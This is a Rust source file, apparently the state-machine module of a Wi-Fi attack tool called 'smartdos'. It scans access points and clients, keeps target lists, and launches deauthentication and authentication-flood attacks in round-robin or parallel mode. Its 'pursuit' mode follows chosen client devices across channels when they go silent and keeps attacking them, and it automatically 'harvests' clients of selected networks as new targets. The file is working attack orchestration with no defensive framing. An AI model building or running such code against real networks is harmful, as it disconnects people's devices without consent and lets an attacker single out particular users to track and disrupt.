use std::fs::OpenOptions;
use std::sync::mpsc;
use std::time::{Duration, Instant};

use crate::attack;
use crate::interface;
use crate::persist;
use crate::saved_lists;
use crate::scanner;
use crate::types::*;

const AP_SAVE_INTERVAL_SECS: u64 = 30;

/// Run one frame of the application state machine
pub fn update(app: &mut App) {
    process_scanner_events(app);
    process_attack_events(app);
    check_pursuit_silence(app);

    // Persist AP list every 30s
    if app.last_ap_save.elapsed() >= Duration::from_secs(AP_SAVE_INTERVAL_SECS) {
        let _ = persist::save_ap_list(&app.ap_list);
        app.last_ap_save = Instant::now();
    }

    rotate_log_if_needed(app);

    // Update FPS counter + CPU usage (both on ~1s cadence)
    app.fps_counter.0 += 1;
    if app.fps_counter.1.elapsed() >= Duration::from_secs(1) {
        app.fps = app.fps_counter.0 as f64 / app.fps_counter.1.elapsed().as_secs_f64();
        app.fps_counter = (0, Instant::now());
        app.sys.refresh_cpu_all();
        app.cpu_usage = app.sys.global_cpu_usage();
    }
}

/// Single-adapter pursuit: if followed client goes silent, trigger channel sweep
fn check_pursuit_silence(app: &mut App) {
    if !app.attack_running || !app.pursuit_mode || app.attack_physical.is_some() || app.sweep_target.is_some() {
        return;
    }
    let followed_macs: Vec<String> = app.followed_clients.iter().map(|(m, _)| m.clone()).collect();
    for mac in followed_macs {
        let last_seen = app.ap_list.iter()
            .flat_map(|ap| ap.clients.iter())
            .find(|c| c.mac == mac)
            .map(|c| c.last_seen);
        if let Some(ls) = last_seen {
            if ls.elapsed() > Duration::from_millis(2500) {
                if let Some(ref tx) = app.scanner_cmd_tx {
                    let _ = tx.send(ScannerCommand::SweepFor { client_mac: mac.clone() });
                }
                app.sweep_target = Some(mac.clone());
                app.add_log(format!("Pursuit sweep: {} silent, scanning all channels", mac));
                break;
            }
        }
    }
}

/// Clear all scan results (AP list, clients, scroll) — bound to 'r'
pub fn clear_scan_results(app: &mut App) {
    app.ap_list.clear();
    app.selected_ap_idx = 0;
    app.scroll_offset = 0;
    app.selected_client_idx = None;
    app.current_channel = 0;
    app.add_log("Scan results cleared".to_string());
    let _ = persist::save_ap_list(&[]);
}

/// Align a matching target's channel/band with the AP the scanner just observed.
/// This corrects stale channel numbers carried in loaded target lists as the real
/// APs are rediscovered. Channel-following injection during an active attack stays
/// opt-in via pursuit mode.
fn sync_target_to_discovered_ap(app: &mut App, bssid: &str, channel: u8, band: Band) {
    if channel == 0 {
        return;
    }
    if let Some(target) = app.targets.iter_mut().find(|t| t.bssid == bssid) {
        if target.channel != channel {
            target.channel = channel;
            target.band = band;
            if app.pursuit_mode && app.attack_running {
                if let Some(ref tx) = app.attack_cmd_tx {
                    let _ = tx.send(AttackCommand::UpdateTargetChannel {
                        bssid: bssid.to_string(),
                        channel,
                        band,
                    });
                }
            }
        }
    }
}

/// Process events from the scanner thread
fn process_scanner_events(app: &mut App) {
    // Bound work per frame so a busy RF environment can't starve the TUI: the
    // main loop must return to render/key-handling even if the scanner keeps
    // flooding events. Anything left in the channel is drained next tick.
    const MAX_EVENTS_PER_TICK: usize = 256;
    let mut needs_sort = false;
    for _ in 0..MAX_EVENTS_PER_TICK {
        match app.scanner_rx.try_recv() {
            Ok(event) => match event {
                ScannerEvent::ApDiscovered(ap) => {
                    let (bssid, channel, band) = (ap.bssid.clone(), ap.channel, ap.band);
                    if let Some(existing) = app.ap_list.iter_mut().find(|a| a.bssid == ap.bssid) {
                        existing.signal_dbm = ap.signal_dbm;
                        existing.signal_percent = ap.signal_percent;
                        existing.band = ap.band;
                        existing.channel = ap.channel;
                        existing.encryption = ap.encryption;
                        existing.last_seen = ap.last_seen;
                    } else {
                        app.ap_list.push(ap);
                        needs_sort = true;
                    }
                    // Correct any loaded target's channel/band as we rediscover its AP.
                    sync_target_to_discovered_ap(app, &bssid, channel, band);
                }
                ScannerEvent::ApUpdated(ap) => {
                    if let Some(existing) = app.ap_list.iter_mut().find(|a| a.bssid == ap.bssid) {
                        // Compute traffic rate: EMA of beacons/sec
                        let elapsed = existing.last_seen.elapsed().as_secs_f64().max(0.05);
                        existing.traffic_rate =
                            0.7 * existing.traffic_rate + 0.3 * (1.0 / elapsed);
                        existing.signal_dbm = ap.signal_dbm;
                        existing.signal_percent = ap.signal_percent;
                        existing.packets = existing.packets.saturating_add(1);
                        existing.last_seen = ap.last_seen;
                        existing.band = ap.band;
                        existing.channel = ap.channel;

                        // Merge scanner clients — update existing, add new, never remove.
                        // App is the source of truth for session history; 'r' clears.
                        for sc in ap.clients {
                            if let Some(ec) = existing.clients.iter_mut().find(|c| c.mac == sc.mac) {
                                ec.signal_dbm = sc.signal_dbm;
                                ec.packets = ec.packets.saturating_add(1);
                                ec.last_seen = sc.last_seen;
                                ec.associated = sc.associated;
                                // friendly_name preserved in-place
                            } else {
                                let mut new_c = sc;
                                if let Some(name) = app.client_names.get(&new_c.mac) {
                                    new_c.friendly_name = Some(name.clone());
                                }
                                existing.clients.push(new_c);
                            }
                        }
                    }
                    if app.ap_list.len() > 1 {
                        needs_sort = true;
                    }
                    // Keep any matching target's channel/band aligned with the AP's
                    // real channel (corrects stale channels from loaded lists);
                    // mid-attack channel following stays opt-in via pursuit mode.
                    sync_target_to_discovered_ap(app, &ap.bssid, ap.channel, ap.band);
                }
                ScannerEvent::ApGone(_bssid) => {
                    // APs persist until user clears with 'r'
                }
                ScannerEvent::ClientDiscovered { ap_bssid, client } => {
                    let fname = app.client_names.get(&client.mac).cloned();
                    if let Some(ap) = app.ap_list.iter_mut().find(|a| a.bssid == ap_bssid) {
                        if !ap.clients.iter().any(|c| c.mac == client.mac) {
                            let mut new_client = client.clone();
                            new_client.friendly_name = fname;
                            ap.clients.push(new_client);
                        }
                    }
                    maybe_update_follow(app, &client.mac, &ap_bssid);
                    handle_sweep_match(app, &client.mac, &ap_bssid);
                    if app.is_ap_harvested(&ap_bssid) {
                        if !app.followed_clients.iter().any(|(m, _)| m == &client.mac) {
                            let ssid = app.ap_list.iter()
                                .find(|a| a.bssid == ap_bssid)
                                .map(|a| a.ssid.clone())
                                .unwrap_or_else(|| ap_bssid.clone());
                            app.followed_clients.push((client.mac.clone(), Some(ap_bssid.clone())));
                            app.rebuild_follow_targets();
                            app.add_log(format!("Harvested: {} from {}", client.mac, ssid));
                            if app.attack_running {
                                let targets = app.targets.clone();
                                if let Some(tx) = &app.attack_cmd_tx {
                                    let _ = tx.send(AttackCommand::UpdateTargets(targets));
                                }
                            }
                        }
                    }
                }
                ScannerEvent::ClientUpdated { ap_bssid, client } => {
                    let mut disconnect_detected = false;
                    if let Some(ap) = app.ap_list.iter_mut().find(|a| a.bssid == ap_bssid) {
                        if let Some(existing) = ap.clients.iter_mut().find(|c| c.mac == client.mac)
                        {
                            let prior_associated = existing.associated;
                            existing.signal_dbm = client.signal_dbm;
                            existing.packets += 1;
                            existing.last_seen = client.last_seen;
                            existing.associated = client.associated;
                            if prior_associated && !client.associated {
                                disconnect_detected = true;
                            }
                        }
                    }
                    if disconnect_detected {
                        if let Some(target) = app.targets.iter_mut().find(|t| t.bssid == ap_bssid) {
                            target.disconnect_count += 1;
                        }
                        let msg = format!("✓ Confirmed disconnect: {} left {}", client.mac, ap_bssid);
                        app.add_log(msg);
                    }
                    maybe_update_follow(app, &client.mac, &ap_bssid);
                    handle_sweep_match(app, &client.mac, &ap_bssid);
                }
                ScannerEvent::ChannelChanged { channel, band } => {
                    app.current_channel = channel;
                    app.current_band = band;
                }
                ScannerEvent::Traffic(count) => {
                    app.total_traffic = app.total_traffic.saturating_add(count);
                    if app.total_traffic > 100_000_000 {
                        app.total_traffic = 0;
                    }
                }
                ScannerEvent::Error(msg) => {
                    app.add_log(msg);
                }
            },
            Err(mpsc::TryRecvError::Empty) => break,
            Err(mpsc::TryRecvError::Disconnected) => {
                app.add_log("Scanner thread disconnected".to_string());
                break;
            }
        }
    }
    // Sort once per tick instead of on every event — keeps the drain O(n) in
    // events rather than O(n log n) per event under heavy beacon traffic.
    if needs_sort && app.ap_list.len() > 1 {
        app.ap_list.sort_by(|a, b| b.signal_dbm.cmp(&a.signal_dbm));
    }
}

/// Check if a seen client is followed; if it roamed, update targets + notify attack thread
fn maybe_update_follow(app: &mut App, client_mac: &str, ap_bssid: &str) {
    let is_followed = app.followed_clients.iter().any(|(m, _)| m == client_mac);
    if !is_followed {
        return;
    }

    let old_ap = app.followed_clients.iter()
        .find(|(m, _)| m == client_mac)
        .and_then(|(_, a)| a.clone());

    app.update_followed_client_ap(client_mac, ap_bssid);

    if old_ap.as_deref() != Some(ap_bssid) && app.attack_running {
        let targets = app.targets.clone();
        if let Some(tx) = &app.attack_cmd_tx {
            let _ = tx.send(AttackCommand::UpdateTargets(targets));
        }
    }
}

/// If a sweep is active and we just saw the target client, re-lock scanner + update attack channel
fn handle_sweep_match(app: &mut App, client_mac: &str, ap_bssid: &str) {
    let is_match = app.sweep_target.as_deref() == Some(client_mac);
    if !is_match {
        return;
    }
    let channel_info = app.ap_list.iter()
        .find(|a| a.bssid == ap_bssid)
        .map(|a| (a.channel, a.band));
    if let Some((ch, band)) = channel_info {
        let mac = app.sweep_target.take().unwrap();
        if let Some(ref tx) = app.scanner_cmd_tx {
            let _ = tx.send(ScannerCommand::LockChannel(ch, band));
        }
        if let Some(ref tx) = app.attack_cmd_tx {
            let _ = tx.send(AttackCommand::UpdateTargetChannel {
                bssid: ap_bssid.to_string(),
                channel: ch,
                band,
            });
        }
        app.add_log(format!("Pursuit: {} found on ch {} ({}), locked", mac, ch, band.label()));
    }
}

/// Process events from the attack thread
fn process_attack_events(app: &mut App) {
    if app.attack_rx.is_none() {
        return;
    }

    // Bound per tick: Parallel mode with a large burst floods DeauthSent events
    // and would otherwise starve the render/key-handling loop.
    const MAX_EVENTS_PER_TICK: usize = 256;
    let mut events = Vec::new();
    for _ in 0..MAX_EVENTS_PER_TICK {
        match app.attack_rx.as_ref().unwrap().try_recv() {
            Ok(event) => events.push(event),
            Err(mpsc::TryRecvError::Empty) => break,
            Err(mpsc::TryRecvError::Disconnected) => {
                events.push(AttackEvent::Error("Attack thread disconnected".to_string()));
                break;
            }
        }
    }

    for event in events {
        match event {
            AttackEvent::DeauthSent { bssid, count } => {
                if let Some(target) = app.targets.iter_mut().find(|t| t.bssid == bssid) {
                    target.deauth_count = count;
                }
            }
            AttackEvent::Error(msg) => {
                if msg == "Attack thread disconnected" {
                    app.attack_running = false;
                }
                app.add_log(msg);
            }
        }
    }
}

/// Open (or create) ~/.smartdos/session.log and attach it to the app
pub fn init_log_file(app: &mut App) {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let dir = std::path::PathBuf::from(home).join(".smartdos");
    let _ = std::fs::create_dir_all(&dir);
    let path = dir.join("session.log");
    match OpenOptions::new().create(true).append(true).open(&path) {
        Ok(f) => {
            app.log_bytes = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
            app.log_file = Some(f);
            app.log_path = Some(path.clone());
            app.add_log(format!("Logging to {}", path.display()));
        }
        Err(e) => {
            app.add_log(format!("Log file open failed: {}", e));
        }
    }
}

/// Cap the on-disk session log: rotate to `session.log.1` once it exceeds the
/// size limit so long-running sessions don't grow the file without bound.
const LOG_MAX_BYTES: u64 = 5 * 1024 * 1024;

fn rotate_log_if_needed(app: &mut App) {
    if app.log_bytes <= LOG_MAX_BYTES {
        return;
    }
    let Some(path) = app.log_path.clone() else { return };
    app.log_file = None; // drop handle before rename
    let rotated = path.with_extension("log.1");
    let _ = std::fs::rename(&path, &rotated);
    match OpenOptions::new().create(true).append(true).open(&path) {
        Ok(f) => {
            app.log_file = Some(f);
            app.log_bytes = 0;
            app.add_log("Log rotated → session.log.1".to_string());
        }
        Err(e) => {
            app.add_log(format!("Log rotation failed: {}", e));
        }
    }
}

/// Initialize the scanner on the given monitor interface
pub fn init_scanner(app: &mut App, mon_iface: &str, supports_5ghz: bool, supports_6ghz: bool) -> Result<(), anyhow::Error> {
    let scanner_tx = app.scanner_tx.clone();
    let running = app.scanner_running.clone();
    let (scanner_cmd_tx, scanner_cmd_rx) = mpsc::channel();

    match scanner::start_scanner(mon_iface, scanner_tx, scanner_cmd_rx, running, supports_5ghz, supports_6ghz, app.band_2ghz_enabled, app.band_5ghz_enabled, app.band_6ghz_enabled) {
        Ok(handle) => {
            app.monitor_interface = Some(mon_iface.to_string());
            app.scanner_cmd_tx = Some(scanner_cmd_tx);
            app.add_log(format!("Scanner started on {}", mon_iface));
            std::thread::spawn(move || {
                let _ = handle.join();
            });
            Ok(())
        }
        Err(e) => {
            app.add_log(format!("Failed to start scanner: {}", e));
            Err(e)
        }
    }
}

/// Start the deauth attack
pub fn start_attack(app: &mut App) {
    if app.targets.is_empty() {
        app.add_log("No targets to attack! Add targets with 't' key.".to_string());
        return;
    }

    let mon_iface = match app.attack_interface.as_ref().or(app.monitor_interface.as_ref()) {
        Some(i) => i.clone(),
        None => {
            app.add_log("No attack interface available.".to_string());
            return;
        }
    };

    let targets = app.targets.clone();
    let mode = app.attack_mode;
    let attack_type = app.attack_type;
    let burst_size = app.burst_size;
    let send_interval_ms = app.send_interval_ms;
    let (attack_tx, attack_rx) = mpsc::channel();
    let (cmd_tx, cmd_rx) = mpsc::channel();
    let running = app.running.clone();

    match attack::start_attack(&mon_iface, targets, mode, attack_type, burst_size, send_interval_ms, attack_tx, cmd_rx, running) {
        Ok(handle) => {
            app.attack_rx = Some(attack_rx);
            app.attack_cmd_tx = Some(cmd_tx);
            app.attack_running = true;
            app.state = AppState::Attacking;
            app.add_log(format!(
                "Attack started: {:?} mode, {} targets",
                mode,
                app.targets.len()
            ));
            // Single-adapter: lock scanner to attack channel to stop channel-hop fighting
            if app.attack_physical.is_none() {
                if let Some(first) = app.targets.first() {
                    let ch = first.channel;
                    let band = first.band;
                    if ch > 0 {
                        if let Some(ref tx) = app.scanner_cmd_tx {
                            let _ = tx.send(ScannerCommand::LockChannel(ch, band));
                        }
                        app.add_log(format!("Scanner locked ch {} ({}) [single adapter]", ch, band.label()));
                    }
                }
            }
            std::thread::spawn(move || {
                let _ = handle.join();
            });
        }
        Err(e) => {
            app.add_log(format!("Failed to start attack: {}", e));
        }
    }
}

/// Stop the deauth attack
pub fn stop_attack(app: &mut App) {
    app.attack_running = false;
    app.state = AppState::Scanning;
    app.attack_rx = None;
    app.attack_cmd_tx = None;
    app.sweep_target = None;
    // Single-adapter: restore channel hopping when attack stops
    if app.attack_physical.is_none() {
        if let Some(ref tx) = app.scanner_cmd_tx {
            let _ = tx.send(ScannerCommand::FreeHop);
        }
    }
    app.add_log("Attack stopped".to_string());
}

/// Toggle attack mode (RoundRobin ↔ Parallel)
pub fn toggle_attack_mode(app: &mut App) {
    app.attack_mode = app.attack_mode.toggle();
    app.add_log(format!("Attack mode: {:?}", app.attack_mode));
}

/// Toggle attack type (Deauth ↔ AuthDos)
pub fn toggle_attack_type(app: &mut App) {
    app.attack_type = app.attack_type.toggle();
    app.add_log(format!("Attack type: {}", app.attack_type.label()));
}

pub fn toggle_pursuit_mode(app: &mut App) {
    app.pursuit_mode = !app.pursuit_mode;
    app.add_log(format!("Pursuit mode: {}", if app.pursuit_mode { "ON" } else { "OFF" }));
}

pub fn open_list_picker(app: &mut App) {
    app.list_picker_slots = saved_lists::list_slots();
    app.list_picker_idx = 0;
    if app.list_picker_slots.is_empty() {
        app.add_log("No saved lists found".to_string());
    } else {
        app.list_picker_open = true;
    }
}

pub fn save_ap_list_named(app: &mut App, name: &str) {
    if name.is_empty() {
        app.add_log("List name cannot be empty".to_string());
        return;
    }
    match saved_lists::save_ap_list_named(name, &app.targets) {
        Ok(()) => app.add_log(format!("Saved AP list: '{}'", name)),
        Err(e) => app.add_log(format!("Save failed: {}", e)),
    }
}

pub fn save_client_list_named(app: &mut App, name: &str) {
    if name.is_empty() {
        app.add_log("List name cannot be empty".to_string());
        return;
    }
    match saved_lists::save_client_list_named(name, &app.followed_clients, &app.client_names) {
        Ok(()) => app.add_log(format!("Saved client list: '{}'", name)),
        Err(e) => app.add_log(format!("Save failed: {}", e)),
    }
}

pub fn load_saved_list(app: &mut App, name: &str) {
    match saved_lists::load_saved_list(name) {
        Ok(saved_lists::LoadedList::Aps(targets)) => {
            let count = targets.len();
            app.targets = targets;
            app.add_log(format!("Loaded AP list '{}': {} targets", name, count));
            if app.attack_running {
                let targets = app.targets.clone();
                if let Some(tx) = &app.attack_cmd_tx {
                    let _ = tx.send(AttackCommand::UpdateTargets(targets));
                }
            }
        }
        Ok(saved_lists::LoadedList::Clients(clients)) => {
            let mut added = 0;
            for (mac, ap, fname) in clients {
                if !app.followed_clients.iter().any(|(m, _)| m == &mac) {
                    app.followed_clients.push((mac.clone(), ap));
                    added += 1;
                }
                if let Some(name_str) = fname {
                    if !name_str.is_empty() {
                        app.client_names.insert(mac.clone(), name_str.clone());
                        for ap_entry in &mut app.ap_list {
                            if let Some(client) = ap_entry.clients.iter_mut().find(|c| c.mac == mac) {
                                client.friendly_name = Some(name_str.clone());
                            }
                        }
                    }
                }
            }
            app.rebuild_follow_targets();
            app.add_log(format!("Loaded client list '{}': {} added", name, added));
            if app.attack_running {
                let targets = app.targets.clone();
                if let Some(tx) = &app.attack_cmd_tx {
                    let _ = tx.send(AttackCommand::UpdateTargets(targets));
                }
            }
        }
        Err(e) => {
            app.add_log(format!("Load failed: {}", e));
        }
    }
}

pub fn set_client_friendly_name(app: &mut App, mac: &str, name: String) {
    if name.is_empty() {
        app.client_names.remove(mac);
        for ap_entry in &mut app.ap_list {
            if let Some(client) = ap_entry.clients.iter_mut().find(|c| c.mac == mac) {
                client.friendly_name = None;
            }
        }
        app.add_log(format!("Cleared name for {}", mac));
    } else {
        app.client_names.insert(mac.to_string(), name.clone());
        for ap_entry in &mut app.ap_list {
            if let Some(client) = ap_entry.clients.iter_mut().find(|c| c.mac == mac) {
                client.friendly_name = Some(name.clone());
            }
        }
        app.add_log(format!("Renamed {} → '{}'", mac, name));
    }
    let _ = saved_lists::save_client_names(&app.client_names);
}

pub fn set_interface(app: &mut App, mon_iface: &str) -> Result<(), anyhow::Error> {
    let monitor = if mon_iface.ends_with("mon") {
        mon_iface.to_string()
    } else {
        interface::enable_monitor_mode(mon_iface)?
    };

    app.monitor_interface = Some(monitor.clone());
    app.current_interface = Some(WirelessInterface {
        name: mon_iface.to_string(),
        phy: String::new(),
        monitor_name: Some(monitor.clone()),
        is_monitor: true,
    });
    app.add_log(format!(
        "Monitor mode enabled: {} -> {}",
        mon_iface, monitor
    ));
    Ok(())
}
